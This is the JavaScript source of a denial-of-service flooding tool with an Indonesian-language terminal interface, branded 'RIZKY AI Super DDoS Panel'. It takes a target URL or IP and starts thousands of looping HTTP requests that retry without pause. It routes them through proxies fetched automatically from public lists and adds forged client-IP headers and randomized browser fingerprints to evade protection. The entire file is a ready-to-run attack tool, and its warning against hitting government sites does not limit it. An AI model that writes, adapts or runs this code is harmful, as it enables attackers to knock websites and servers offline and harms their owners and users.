const axios = require('axios');
const fs = require('fs');
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');
const readline = require('readline');
const { URL } = require('url');

// =============================================
// SUPER GANAS CONFIGURATION
// =============================================
const BOT_CONFIG = {
    proxyFile: "proxy.txt",
    userAgentFile: "ua.txt",
    
    // Enhanced Attack Settings
    maxThreads: 5000,
    requestsPerSecond: 10000,
    timeout: 3000,
    
    // Enhanced Headers untuk Bypass Protection
    acceptHeaders: [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "application/json, text/plain, */*"
    ],

    encodingHeaders: [
        "gzip, deflate, br",
        "gzip, deflate",
        "identity"
    ],

    languageHeaders: [
        "en-US,en;q=0.9",
        "en-US,en;q=0.8",
        "id,en;q=0.9",
        "id-ID,id;q=0.9,en;q=0.8"
    ],

    referers: [
        "https://www.google.com/",
        "https://www.facebook.com/",
        "https://www.youtube.com/",
        "https://www.twitter.com/",
        "https://www.instagram.com/",
        "https://www.reddit.com/",
        "https://www.linkedin.com/",
        "https://www.github.com/"
    ],

    cacheControls: [
        "no-cache",
        "max-age=0",
        "no-store"
    ],

    // Advanced Bypass Techniques
    bypassHeaders: {
        'X-Forwarded-For': () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        'X-Real-IP': () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        'X-Client-IP': () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        'CF-Connecting-IP': () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        'True-Client-IP': () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
    },

    // Attack Methods
    methods: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'],
    
    // Proxy Sources untuk auto-update
    proxySources: [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=10000",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt"
    ]
};

// =============================================
// ENHANCED FUNCTIONS
// =============================================

class SuperAttackManager {
    constructor() {
        this.active = true;
        this.stats = {
            success: 0,
            error: 0,
            startTime: Date.now()
        };
    }

    readProxies() {
        try {
            if (!fs.existsSync(BOT_CONFIG.proxyFile)) {
                console.log('\x1b[33m[⚠️] File proxy tidak ditemukan, menggunakan direct connection\x1b[0m');
                return [];
            }
            const data = fs.readFileSync(BOT_CONFIG.proxyFile, "utf8");
            const proxies = data.trim().split("\n").map(line => line.trim()).filter(line => line);
            console.log(`\x1b[32m[✅] Loaded ${proxies.length} proxies\x1b[0m`);
            return proxies;
        } catch (error) {
            console.error(`\x1b[31m[❌] Gagal membaca proxy: ${error}\x1b[0m`);
            return [];
        }
    }

    readUserAgents() {
        try {
            const data = fs.readFileSync(BOT_CONFIG.userAgentFile, "utf-8")
                .replace(/\r/g, "")
                .split("\n");
            const agents = data.map(line => line.trim()).filter(line => line);
            console.log(`\x1b[32m[✅] Loaded ${agents.length} user agents\x1b[0m`);
            return agents;
        } catch (error) {
            console.error(`\x1b[31m[❌] Gagal membaca user agents, menggunakan default\x1b[0m`);
            return [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
            ];
        }
    }

    getRandomElement(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }

    sanitizeUserAgent(userAgent) {
        return userAgent.replace(/[^\x20-\x7E]/g, "");
    }

    createAgent(proxy) {
        if (!proxy) return null;
        try {
            const proxyParts = proxy.split(":");
            const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
            const proxyUrl = `${proxyProtocol}://${proxyParts[1] ? `${proxyParts[0]}:${proxyParts[1]}` : proxyParts[0]}`;
            
            return proxyProtocol === "socks5" 
                ? new SocksProxyAgent(proxyUrl)
                : new HttpsProxyAgent(proxyUrl);
        } catch (error) {
            return null;
        }
    }

    // Enhanced Request dengan Bypass Techniques
    async sendEnhancedRequest(target, agent, userAgents, requestId) {
        if (!this.active) return;

        try {
            const method = this.getRandomElement(BOT_CONFIG.methods);
            const sanitizedUserAgent = this.sanitizeUserAgent(this.getRandomElement(userAgents));
            
            // Generate advanced headers dengan bypass techniques
            const headers = {
                "User-Agent": sanitizedUserAgent,
                "Accept": this.getRandomElement(BOT_CONFIG.acceptHeaders),
                "Accept-Encoding": this.getRandomElement(BOT_CONFIG.encodingHeaders),
                "Accept-Language": this.getRandomElement(BOT_CONFIG.languageHeaders),
                "Referer": this.getRandomElement(BOT_CONFIG.referers),
                "Cache-Control": this.getRandomElement(BOT_CONFIG.cacheControls),
                "DNT": "1",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none"
            };

            // Tambahkan bypass headers
            Object.keys(BOT_CONFIG.bypassHeaders).forEach(header => {
                headers[header] = BOT_CONFIG.bypassHeaders[header]();
            });

            const requestConfig = {
                httpAgent: agent,
                httpsAgent: agent,
                headers: headers,
                timeout: BOT_CONFIG.timeout,
                validateStatus: function (status) {
                    return status >= 200 && status < 600;
                }
            };

            if (method === 'POST' || method === 'PUT') {
                requestConfig.data = `data=${Math.random().toString(36).substring(7)}`;
            }

            const response = await axios({
                method: method,
                url: target,
                ...requestConfig
            });

            this.stats.success++;
            
            // Immediate retry untuk maximum aggression
            setImmediate(() => this.sendEnhancedRequest(target, agent, userAgents, requestId));

        } catch (error) {
            this.stats.error++;
            // Immediate retry meski error
            setImmediate(() => this.sendEnhancedRequest(target, agent, userAgents, requestId));
        }
    }

    // Auto-update proxies
    async updateProxies() {
        console.log('\x1b[36m[🔄] Memulai update proxy...\x1b[0m');
        
        let allProxies = [];
        const tempFile = 'proxy_temp.txt';

        const promises = BOT_CONFIG.proxySources.map(async (source) => {
            try {
                const response = await axios.get(source, { 
                    timeout: 8000,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                });
                const proxies = response.data.split('\n')
                    .map(line => line.trim())
                    .filter(line => line && this.isValidProxy(line));
                
                console.log(`\x1b[32m[✅] ${proxies.length} proxy dari ${new URL(source).hostname}\x1b[0m`);
                return proxies;
            } catch (error) {
                console.log(`\x1b[33m[⚠️] Gagal dari ${source}: ${error.message}\x1b[0m`);
                return [];
            }
        });

        const results = await Promise.allSettled(promises);
        
        results.forEach(result => {
            if (result.status === 'fulfilled') {
                allProxies = [...allProxies, ...result.value];
            }
        });

        allProxies = [...new Set(allProxies)];
        
        fs.writeFileSync(tempFile, allProxies.join('\n'));
        
        if (fs.existsSync(BOT_CONFIG.proxyFile)) {
            fs.unlinkSync(BOT_CONFIG.proxyFile);
        }
        fs.renameSync(tempFile, BOT_CONFIG.proxyFile);
        
        console.log(`\x1b[32m[📊] Update selesai! Total ${allProxies.length} proxy tersedia\x1b[0m`);
        return allProxies;
    }

    isValidProxy(proxy) {
        const pattern = /^(\d{1,3}\.){3}\d{1,3}:\d{1,5}$/;
        return pattern.test(proxy);
    }

    startSuperAttack(targetUrl) {
        console.log('\x1b[35m[🚀] MEMULAI SERANGAN SUPER GANAS!\x1b[0m');
        console.log(`\x1b[36m[🎯] Target: ${targetUrl}\x1b[0m`);
        console.log(`\x1b[36m[⚡] Threads: ${BOT_CONFIG.maxThreads}\x1b[0m`);
        
        const proxies = this.readProxies();
        const userAgents = this.readUserAgents();

        this.stats = {
            success: 0,
            error: 0,
            startTime: Date.now()
        };

        // Start stats display
        this.showStats();

        // Launch attack threads
        for (let i = 0; i < BOT_CONFIG.maxThreads; i++) {
            setTimeout(() => {
                const proxy = proxies.length > 0 ? this.getRandomElement(proxies) : null;
                const agent = this.createAgent(proxy);
                this.sendEnhancedRequest(targetUrl, agent, userAgents, i);
            }, i * 10);
        }

        console.log('\x1b[32m[✅] Semua thread serangan telah diluncurkan!\x1b[0m');
    }

    showStats() {
        setInterval(() => {
            if (!this.active) return;
            
            const duration = Math.floor((Date.now() - this.stats.startTime) / 1000);
            const totalRequests = this.stats.success + this.stats.error;
            const rps = duration > 0 ? Math.floor(totalRequests / duration) : 0;
            const successRate = totalRequests > 0 ? ((this.stats.success / totalRequests) * 100).toFixed(1) : 0;

            process.stdout.write('\x1Bc');
            console.log('\x1b[48;5;21m╔═══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
            console.log('\x1b[48;5;21m║                     🚀 RIZKY AI - SUPER DDoS PANEL 🚀                      ║\x1b[0m');
            console.log('\x1b[48;5;21m║                         🔥 VERSION: ULTRA GANAS 🔥                         ║\x1b[0m');
            console.log('\x1b[48;5;21m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
            console.log('');
            
            // Server Info Panel
            console.log('\x1b[48;5;93m╭───────────────────── SERVER INFORMATION ────────────────────╮\x1b[0m');
            console.log(`\x1b[38;5;87m│ 🎯 Target        │ \x1b[38;5;226m${this.targetUrl || 'N/A'}\x1b[0m`);
            console.log(`\x1b[38;5;87m│ ⚡ Threads       │ \x1b[38;5;46m${BOT_CONFIG.maxThreads.toLocaleString()}\x1b[0m`);
            console.log(`\x1b[38;5;87m│ 🕒 Duration      │ \x1b[38;5;226m${this.formatTime(duration)}\x1b[0m`);
            console.log('\x1b[48;5;93m╰─────────────────────────────────────────────────────────────╯\x1b[0m');
            console.log('');

            // Attack Statistics
            console.log('\x1b[48;5;202m╭───────────────────── ATTACK STATISTICS ────────────────────╮\x1b[0m');
            console.log(`\x1b[38;5;231m│ 📊 Total Requests │ \x1b[38;5;46m${totalRequests.toLocaleString()}\x1b[0m`);
            console.log(`\x1b[38;5;231m│ ⚡ RPS            │ \x1b[38;5;196m${rps.toLocaleString()}\x1b[0m`);
            console.log(`\x1b[38;5;231m│ ✅ Success       │ \x1b[38;5;46m${this.stats.success.toLocaleString()}\x1b[0m`);
            console.log(`\x1b[38;5;231m│ ❌ Errors        │ \x1b[38;5;196m${this.stats.error.toLocaleString()}\x1b[0m`);
            console.log(`\x1b[38;5;231m│ 📈 Success Rate  │ \x1b[38;5;226m${successRate}%\x1b[0m`);
            console.log('\x1b[48;5;202m╰─────────────────────────────────────────────────────────────╯\x1b[0m');
            console.log('');

            // Progress Bar dengan animasi
            const progress = (duration % 100) / 100;
            const width = 60;
            const filled = Math.floor(progress * width);
            const empty = width - filled;
            const bar = '█'.repeat(filled) + '░'.repeat(empty);
            
            console.log('\x1b[48;5;238m╭─────────────────────── ATTACK PROGRESS ─────────────────────╮\x1b[0m');
            console.log(`\x1b[38;5;231m│ \x1b[38;5;46m${bar}\x1b[38;5;231m │ \x1b[38;5;226m${Math.floor(progress * 100)}%\x1b[38;5;231m │\x1b[0m`);
            console.log('\x1b[48;5;238m╰─────────────────────────────────────────────────────────────╯\x1b[0m');
            console.log('');

            // System Status
            console.log('\x1b[48;5;28m╭────────────────────── SYSTEM STATUS ───────────────────────╮\x1b[0m');
            console.log('\x1b[38;5;231m│ 🟢 SERANGAN AKTIF │ 🟢 PROXY ACTIVE │ 🟢 THREADS RUNNING │\x1b[0m');
            console.log('\x1b[48;5;28m╰────────────────────────────────────────────────────────────╯\x1b[0m');
            console.log('');
            
            console.log('\x1b[41m╔═══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
            console.log('\x1b[41m║                         ⚠️  TEKAN CTRL+C UNTUK BERHENTI ⚠️                    ║\x1b[0m');
            console.log('\x1b[41m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
            
        }, 2000);
    }

    formatTime(seconds) {
        const hours = Math.floor(seconds / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;
        
        if (hours > 0) {
            return `${hours}h ${minutes}m ${secs}s`;
        } else if (minutes > 0) {
            return `${minutes}m ${secs}s`;
        } else {
            return `${secs}s`;
        }
    }

    stop() {
        this.active = false;
        console.log('\x1b[31m[🛑] SERANGAN DIHENTIKAN!\x1b[0m');
    }
}

// =============================================
// MAIN EXECUTION - TANPA PASSWORD
// =============================================

const attackManager = new SuperAttackManager();
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function showMainMenu() {
    console.log('\x1Bc');
    console.log('\x1b[48;5;21m╔═══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
    console.log('\x1b[48;5;21m║                     🚀 RIZKY AI SUPER DDoS PANEL 🚀                       ║\x1b[0m');
    console.log('\x1b[48;5;21m║                         🔥 VERSION: ULTRA GANAS 🔥                         ║\x1b[0m');
    console.log('\x1b[48;5;21m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
    console.log('');
    
    // Info Panel
    console.log('\x1b[48;5;93m╭───────────────────────── PANEL INFO ────────────────────────╮\x1b[0m');
    console.log('\x1b[38;5;231m│ 🤖 BOT NAME  │ RIZKY-AI ULTRA                            │\x1b[0m');
    console.log('\x1b[38;5;231m│ 🚀 VERSION   │ 3.0 SUPER GANAS                           │\x1b[0m');
    console.log('\x1b[38;5;231m│ 👑 AUTHOR    │ RIZKY CYBER                               │\x1b[0m');
    console.log('\x1b[38;5;231m│ 📅 STATUS    │ READY FOR ATTACK                          │\x1b[0m');
    console.log('\x1b[48;5;93m╰─────────────────────────────────────────────────────────────╯\x1b[0m');
    console.log('');

    // Info Panel
    console.log('\x1b[48;5;93m╭───────────────────────── PANEL INFO ────────────────────────╮\x1b[0m');
    console.log('\x1b[38;5;231m│ 🤖 BOT NAME  │ RIZKY-AI ULTRA                            │\x1b[0m');
    console.log('\x1b[38;5;231m│ 🚀 VERSION   │ 3.0 SUPER GANAS                           │\x1b[0m');
    console.log('\x1b[38;5;231m│ 👑 AUTHOR    │ RIZKY CYBER                               │\x1b[0m');
    console.log('\x1b[38;5;231m│ 📅 STATUS    │ READY FOR ATTACK                          │\x1b[0m');
    console.log('\x1b[48;5;93m╰─────────────────────────────────────────────────────────────╯\x1b[0m');
    console.log('');

    // Features Panel
    console.log('\x1b[48;5;202m╭────────────────────── SUPER FEATURES ──────────────────────╮\x1b[0m');
    console.log('\x1b[38;5;231m│ ✅ 5000+ Concurrent Threads                             │\x1b[0m');
    console.log('\x1b[38;5;231m│ ✅ Auto Proxy Rotation & Update                         │\x1b[0m');
    console.log('\x1b[38;5;231m│ ✅ Advanced Bypass Protection                           │\x1b[0m');
    console.log('\x1b[38;5;231m│ ✅ Real-Time Statistics Dashboard                       │\x1b[0m');
    console.log('\x1b[38;5;231m│ ✅ Multiple Attack Methods                              │\x1b[0m');
    console.log('\x1b[38;5;231m│ ✅ Ultra Fast Request Rate (10k+ RPS)                   │\x1b[0m');
    console.log('\x1b[48;5;202m╰─────────────────────────────────────────────────────────────╯\x1b[0m');
    console.log('');

    // Warning Panel
    console.log('\x1b[48;5;196m╭────────────────────── ⚠️ PERINGATAN ⚠️ ─────────────────────╮\x1b[0m');
    console.log('\x1b[38;5;231m│ 🚫 JANGAN SERANG WEBSITE PEMERINTAH                     │\x1b[0m');
    console.log('\x1b[38;5;231m│ 🚫 JANGAN SERANG WEBSITE PENDIDIKAN                    │\x1b[0m');
    console.log('\x1b[38;5;231m│ 🚫 GUNAKAN DENGAN BIJAK DAN TANGGUNG JAWAB              │\x1b[0m');
    console.log('\x1b[48;5;196m╰─────────────────────────────────────────────────────────────╯\x1b[0m');
    console.log('');
    
    showTargetSelectionMenu();
}

function showTargetSelectionMenu() {
    console.log('\x1b[48;5;46m╔═══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
    console.log('\x1b[48;5;46m║                         🎯 PILIH JENIS TARGET 🎯                           ║\x1b[0m');
    console.log('\x1b[48;5;46m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
    console.log('');
    
    console.log('\x1b[48;5;27m╭─────────────────────────────────────────────────────────────╮\x1b[0m');
    console.log('\x1b[38;5;231m│                  📋 MENU PILIHAN TARGET                   │\x1b[0m');
    console.log('\x1b[48;5;27m├─────────────────────────────────────────────────────────────┤\x1b[0m');
    console.log('\x1b[38;5;231m│  [1] 🟢 GUNAKAN URL WEBSITE                              │\x1b[0m');
    console.log('\x1b[38;5;231m│  [2] 🔵 GUNAKAN IP ADDRESS WEBSITE                       │\x11b[0m');
    console.log('\x1b[38;5;231m│  [3] ❌ KELUAR DARI PROGRAM                              │\x1b[0m');
    console.log('\x1b[48;5;27m╰─────────────────────────────────────────────────────────────╯\x1b[0m');
    console.log('');
    
    rl.question('\x1b[38;5;226m[🎯] Pilih opsi (1-3): \x1b[0m', (choice) => {
        switch (choice) {
            case '1':
                askForWebsiteUrl();
                break;
            case '2':
                askForIpAddress();
                break;
            case '3':
                console.log('\x1b[32m👋 Terima kasih telah menggunakan RIZKY AI!\x1b[0m');
                process.exit(0);
                break;
            default:
                console.log('\x1b[31m❌ Pilihan tidak valid! Silakan pilih 1, 2, atau 3.\x1b[0m');
                setTimeout(() => showTargetSelectionMenu(), 2000);
                break;
        }
    });
}

function askForWebsiteUrl() {
    console.log('\x1b[48;5;46m╔═══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
    console.log('\x1b[48;5;46m║                         🌐 WEBSITE URL INPUT 🌐                            ║\x1b[0m');
    console.log('\x1b[48;5;46m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
    console.log('');
    console.log('\x1b[33m💡 Contoh: https://example.com atau http://targetwebsite.com\x1b[0m');
    console.log('');
    
    rl.question('\x1b[38;5;226m[🌐] Masukkan URL Website: \x1b[0m', async (url) => {
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            showErrorMessage('URL harus diawali dengan http:// atau https://');
            setTimeout(() => askForWebsiteUrl(), 2000);
            return;
        }

        if (!validateUrl(url)) {
            showErrorMessage('Format URL tidak valid!');
            setTimeout(() => askForWebsiteUrl(), 2000);
            return;
        }

        await startAttackProcess(url, 'WEBSITE');
    });
}

function askForIpAddress() {
    console.log('\x1b[48;5;33m╔═══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
    console.log('\x1b[48;5;33m║                         🔵 IP ADDRESS INPUT 🔵                             ║\x1b[0m');
    console.log('\x1b[48;5;33m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
    console.log('');
    console.log('\x1b[33m💡 Contoh: 192.168.1.1:80 atau 104.16.249.249:443\x1b[0m');
    console.log('\x1b[36m💡 Port akan otomatis ditambahkan jika tidak disertakan\x1b[0m');
    console.log('');
    
    rl.question('\x1b[38;5;87m[🔵] Masukkan IP Address: \x1b[0m', async (ipInput) => {
        let targetUrl = formatIpTarget(ipInput);
        
        if (!validateIpAddress(ipInput)) {
            showErrorMessage('Format IP Address tidak valid!');
            setTimeout(() => askForIpAddress(), 2000);
            return;
        }

        await startAttackProcess(targetUrl, 'IP');
    });
}

function formatIpTarget(ipInput) {
    // Jika input sudah mengandung port
    if (ipInput.includes(':')) {
        const parts = ipInput.split(':');
        if (parts.length === 2) {
            return `http://${parts[0]}:${parts[1]}`;
        }
    }
    
    // Jika tidak ada port, gunakan port 80 default
    return `http://${ipInput}:80`;
}

function validateUrl(url) {
    try {
        new URL(url);
        return true;
    } catch (error) {
        return false;
    }
}

function validateIpAddress(ip) {
    // Validasi IPv4 dengan port opsional
    const ipPattern = /^(\d{1,3}\.){3}\d{1,3}(:\d{1,5})?$/;
    if (!ipPattern.test(ip)) return false;
    
    // Validasi setiap octet
    const parts = ip.split(':')[0].split('.');
    for (let part of parts) {
        const num = parseInt(part);
        if (num < 0 || num > 255) return false;
    }
    
    return true;
}

async function startAttackProcess(targetUrl, type) {
    showLoadingScreen(targetUrl, type);
    
    try {
        await attackManager.updateProxies();
    } catch (error) {
        console.log('\x1b[33m⚠️ Gagal update proxy, menggunakan yang existing...\x1b[0m');
    }

    setTimeout(() => {
        attackManager.targetUrl = targetUrl;
        attackManager.startSuperAttack(targetUrl);
    }, 3000);
}

function showLoadingScreen(targetUrl, type) {
    console.log('\x1Bc');
    console.log('\x1b[48;5;21m╔═══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
    console.log('\x1b[48;5;21m║                   🚀 MEMPERSIAPKAN SERANGAN 🚀                            ║\x1b[0m');
    console.log('\x1b[48;5;21m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
    console.log('');
    console.log(`\x1b[38;5;87m🎯 Target: ${targetUrl}\x1b[0m`);
    console.log(`\x1b[38;5;87m📝 Type: ${type}\x1b[0m`);
    console.log('');
    
    let progress = 0;
    const interval = setInterval(() => {
        progress += 2;
        const width = 50;
        const filled = Math.floor((progress / 100) * width);
        const empty = width - filled;
        const bar = '█'.repeat(filled) + '▒'.repeat(empty);
        
        const steps = [
            'Loading Attack Modules...',
            'Initializing Proxy Rotation...',
            'Setting Up Threads...',
            'Configuring Bypass Methods...',
            'Ready to Attack!'
        ];
        const currentStep = steps[Math.floor(progress / 20)] || steps[steps.length - 1];
        
        process.stdout.write(`\r\x1b[38;5;46m[${bar}] ${progress}% 🚀 ${currentStep}\x1b[0m`);
        
        if (progress >= 100) {
            clearInterval(interval);
            console.log('\n\n\x1b[48;5;46m╔═══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
            console.log('\x1b[48;5;46m║                    ✅ SERANGAN SIAP DILUNCURKAN! ✅                           ║\x1b[0m');
            console.log('\x1b[48;5;46m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
        }
    }, 50);
}

function showErrorMessage(message) {
    console.log('\x1b[48;5;196m╔═══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
    console.log('\x1b[48;5;196m║                           ❌ ERROR TERDETEKSI ❌                            ║\x1b[0m');
    console.log('\x1b[48;5;196m║                                                                               ║\x1b[0m');
    console.log(`\x1b[48;5;196m║          ${message.padEnd(55)}          ║\x1b[0m`);
    console.log('\x1b[48;5;196m║                                                                               ║\x1b[0m');
    console.log('\x1b[48;5;196m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
}

// Handle CTRL+C
process.on('SIGINT', () => {
    console.log('\n\n\x1b[48;5;196m╔═══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
    console.log('\x1b[48;5;196m║                      🛑 MENGENTIKAN SERANGAN... 🛑                           ║\x1b[0m');
    console.log('\x1b[48;5;196m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
    attackManager.stop();
    setTimeout(() => {
        console.log('\x1b[48;5;46m╔═══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
        console.log('\x1b[48;5;46m║                 👋 TERIMA KASIH TELAH MENGGUNAKAN RIZKY AI! 👋               ║\x1b[0m');
        console.log('\x1b[48;5;46m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
        process.exit(0);
    }, 2000);
});

// Start aplikasi langsung tanpa password
console.log('\x1b[35m🚀 MEMUAT RIZKY AI SUPER DDoS PANEL...\x1b[0m');
setTimeout(() => {
    showMainMenu();
}, 1000);
